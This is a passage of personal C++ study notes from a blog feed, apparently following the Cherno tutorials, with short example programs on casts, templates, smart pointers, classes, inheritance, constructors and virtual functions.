class="built_in">array2d_2</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//array2d_1:3027ms</span></span><br><span class="line"><span class="comment">//array2d_2:1762ms</span></span><br></pre></td></tr></table></figure><h3 id="type-cast"><a href="#type-cast" class="headerlink" title="type cast"></a>type cast</h3><ul><li>static_cast</li><li>reinterpre_cast</li><li>dynamic_cast   (Runtime type information)</li><li>const_cast</li></ul><p><code>dynamic_cast</code>is specialized for pointer casting in inheritance hierarchies and must be a polymorphic class type (base class has vtable)</p><p>//TODO</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>:<span class="keyword">public</span> Entity</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Enemy</span> : <span class="keyword">public</span> Entity</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Player* player = <span class="keyword">new</span> <span class="built_in">Player</span>();</span><br><span class="line">Entity* actuallyEnemy = <span class="keyword">new</span> <span class="built_in">Enemy</span>();</span><br><span class="line">Player* actuallyPlayer = player;</span><br><span class="line"></span><br><span class="line">Player* p0 = <span class="built_in">dynamic_cast</span>&lt;Player*&gt;(actuallyEnemy);<span class="comment">//p0 = null</span></span><br><span class="line">Player* p1 = <span class="built_in">dynamic_cast</span>&lt;Player*&gt;(actuallyPlayer);<span class="comment">//p1 = Player class address</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h3><p>\\TODO</p><h3 id="templetes-generics"><a href="#templetes-generics" class="headerlink" title="templetes(generics)"></a>templetes(generics)</h3><ul><li><p>The compiler writes code for you based on the rules you provide.</p></li><li><p>Template will never exist until we call it.</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(T value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Array</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">T m_Array[N];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> N;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Array&lt;<span class="type">int</span>, <span class="number">5</span>&gt; array;</span><br><span class="line">std::cout &lt;&lt; array.<span class="built_in">GetSize</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Print</span>(<span class="number">123</span>);</span><br><span class="line"><span class="built_in">Print</span>(<span class="string">&quot;Randolfluo&quot;</span>);</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Smart-ptr"><a href="#Smart-ptr" class="headerlink" title="Smart ptr"></a>Smart ptr</h3><p>我们不能复制unique_ptr,因为free掉回产生空指针问题</p><p><code>unique_ptr</code></p><ul><li><p>Unique_ptr deletes when over the scope.</p></li><li><p>We can’t copy unique_ptr,because  when class free will generate null pointer.</p></li></ul><p><code>shared_ptr</code></p><ul><li>When the reference count equals zero, destruct the entity.</li></ul><p><code>weak_ptr</code></p><ul><li>weak_ptr can’t make reference count increase or decrease.</li><li>A weak_ptr cannot increase or decrease the reference count.</li></ul><p><code>auto_ptr</code></p><ul><li>(deprecated in C++11) (removed in C++17)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> m_Num;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">int</span> x)</span><br><span class="line">:<span class="built_in">m_Num</span>(x)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;call Entity &quot;</span>  &lt;&lt; m_Num &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Entity</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;destruct Entity &quot;</span> &lt;&lt; m_Num &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#123;</span><br><span class="line">std::shared_ptr&lt;Entity&gt; e0;</span><br><span class="line">&#123;</span><br><span class="line">std::unique_ptr&lt;Entity&gt; entity = std::<span class="built_in">make_unique</span>&lt;Entity&gt;(<span class="number">1</span>);<span class="comment">//call Entity 1</span></span><br><span class="line"></span><br><span class="line">std::shared_ptr&lt;Entity&gt; sharedEntity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;(<span class="number">2</span>);<span class="comment">//call Entity 2</span></span><br><span class="line">e0 = sharedEntity;</span><br><span class="line">&#125;<span class="comment">//destruct Entity 1</span></span><br><span class="line">&#125;<span class="comment">//destruct Entity 2</span></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> cherno </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> cherno </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CppClass</title>
      <link href="/2024/03/18/C&amp;C++/CppClass/"/>
      <url>/2024/03/18/C&amp;C++/CppClass/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="class"><a href="#class" class="headerlink" title="class"></a>class</h1><ul><li>The fundamental ideas behind classes are <code>data abstraction</code> and <code>encapsulation</code>.</li><li>The only difference between classes and structs is the default visibility.</li><li>Use the prefix <code>m_</code>   to denote a private variable.</li><li>class can reduces duplication</li></ul><h4 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h4> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> speed;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">(<span class="type">int</span> xa, <span class="type">int</span> ya)</span><span class="comment">//Functions in a class are called methods.</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> x += xa * speed;</span><br><span class="line"> y += ya * speed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;<span class="comment">//Notice the semicolons</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">Player player1;</span><br><span class="line">player<span class="number">1.</span>x = <span class="number">5</span>;</span><br><span class="line">player<span class="number">1.</span>y = <span class="number">5</span>;</span><br><span class="line">player<span class="number">1.</span>speed= <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">player<span class="number">1.</span><span class="built_in">Move</span>(<span class="number">1</span>, <span class="number">-1</span>);  </span><br><span class="line">    <span class="built_in">LOG</span>(player<span class="number">1.</span>x);</span><br><span class="line">    <span class="built_in">LOG</span>(player<span class="number">1.</span>y);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Initializing-a-class"><a href="#Initializing-a-class" class="headerlink" title="Initializing a class"></a>Initializing a class</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Entity <span class="title">e</span><span class="params">(<span class="string">&quot;Randolfluo&quot;</span>)</span></span>;<span class="comment">//stack</span></span><br><span class="line">e.<span class="built_in">GetNum</span>();</span><br><span class="line">Entity* entity = <span class="keyword">new</span> <span class="built_in">Entity</span>(<span class="string">&quot;Randolfluo&quot;</span>);<span class="comment">//heap</span></span><br><span class="line">entity-&gt;<span class="built_in">GetNum</span>();</span><br><span class="line"><span class="keyword">delete</span> entity ;</span><br></pre></td></tr></table></figure><p>Allocate on the heap:</p><ul><li>Object really really binggggg!</li><li>I want to explicitly control the lifetime of the object.</li></ul><h3 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">(<span class="type">int</span> xa, <span class="type">int</span> ya)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x += xa;</span><br><span class="line">y += ya;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity<span class="comment">//Anything that is not private in the Entity class is accessible to the player class</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* Name;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Player player1;</span><br><span class="line">player<span class="number">1.</span>x = <span class="number">5</span>;</span><br><span class="line">player<span class="number">1.</span>y = <span class="number">5</span>;</span><br><span class="line">player<span class="number">1.</span>Name = <span class="string">&quot;Randolfluo&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">player<span class="number">1.</span><span class="built_in">Move</span>(<span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">LOG</span>(<span class="keyword">sizeof</span> Entity);</span><br><span class="line"><span class="built_in">LOG</span>(<span class="keyword">sizeof</span> Player);</span><br><span class="line"><span class="built_in">LOG</span>(player<span class="number">1.</span>Name);</span><br><span class="line"><span class="built_in">LOG</span>(player<span class="number">1.</span>x);</span><br><span class="line"><span class="built_in">LOG</span>(player<span class="number">1.</span>y);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Log-class"><a href="#Log-class" class="headerlink" title="Log class"></a>Log class</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Log</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Level</span></span><br><span class="line">&#123;</span><br><span class="line">LevelError = <span class="number">0</span>, LevelWarning, LevelInfo  <span class="comment">//LevelError = 0, LevelWarning = 1, LevelInfo = 2  </span></span><br><span class="line">&#125;;<span class="comment">//Only these three modes can be selected</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> m_LogLevel = LevelInfo;  </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetLevel</span><span class="params">(<span class="type">int</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_LogLevel = level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Error</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelError)</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[ERROR]: &quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Warn</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelWarning)</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[WARNING]: &quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Info</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelInfo)</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[INFO]: &quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Log log;</span><br><span class="line">log.<span class="built_in">SetLevel</span>(Log::LevelError);  </span><br><span class="line">log.<span class="built_in">Warn</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Error</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Info</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="class-lifetime"><a href="#class-lifetime" class="headerlink" title="class lifetime"></a>class lifetime</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;call Entity()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Entity</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;destruct Entity()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScopedPtr</span><span class="comment">//ScopedPtr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Entity* m_Ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">ScopedPtr</span>(Entity* ptr)</span><br><span class="line">:<span class="built_in">m_Ptr</span>(ptr)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">ScopedPtr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_Ptr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#123;</span><br><span class="line">ScopedPtr e = <span class="keyword">new</span> <span class="built_in">Entity</span>();<span class="comment">//new Entity instead of ScopedPtr</span></span><br><span class="line"><span class="comment">//So e will be deleted after this scope</span></span><br><span class="line">&#125;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">//output</span></span><br><span class="line"><span class="comment">//call Entity()</span></span><br><span class="line"><span class="comment">//destruct Entity()</span></span><br></pre></td></tr></table></figure><h3 id="constructor-amp-amp-destructor"><a href="#constructor-amp-amp-destructor" class="headerlink" title="constructor &amp;&amp; destructor"></a>constructor &amp;&amp; destructor</h3><ul><li><p>Don’t forget initialization.</p></li><li><p>The constructor is automatically executed when the object is instantiated and does not need to be called manually.</p></li><li>A class can have multiple constructors. Each constructor must differ from the others in the number or types of its parameters.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> X, Y;</span><br><span class="line"><span class="built_in">Entity</span>() <span class="comment">//no-args constructor</span></span><br><span class="line">&#123;</span><br><span class="line">X = <span class="number">0.0f</span>;</span><br><span class="line">Y = <span class="number">0.0f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">float</span> a, <span class="type">float</span> b)<span class="comment">//2-args constructor</span></span><br><span class="line">&#123;</span><br><span class="line">X = a, Y = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Entity() = delete;  delete the default constructor</span></span><br><span class="line"></span><br><span class="line">~<span class="built_in">Entity</span>()<span class="comment">//destructor</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; X &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; Y &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Entity e;</span><br><span class="line"><span class="function">Entity <span class="title">e1</span><span class="params">(<span class="number">10.0</span>, <span class="number">22.0</span>)</span></span>;</span><br><span class="line">e.<span class="built_in">Print</span>();</span><br><span class="line">e<span class="number">1.</span><span class="built_in">Print</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="virtual-function"><a href="#virtual-function" class="headerlink" title="virtual function"></a>virtual function</h3><ul><li>Base on Dynamic Dispatch  &amp;&amp; v table，cause performance loss.</li><li>Like java’s overwrite</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span 